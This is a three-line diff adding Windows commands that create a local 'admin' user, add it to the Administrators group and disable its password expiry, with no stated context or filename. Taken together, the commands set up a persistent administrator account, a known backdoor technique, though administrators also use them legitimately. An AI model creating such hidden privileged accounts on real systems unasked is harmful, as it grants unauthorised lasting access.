@@ -1,0 +1,3 @@
+net user admin PASSWORD /add
+net localgroup administrators admin /add
+WMIC USERACCOUNT WHERE Name='admin’ SET PasswordExpires=FALSE
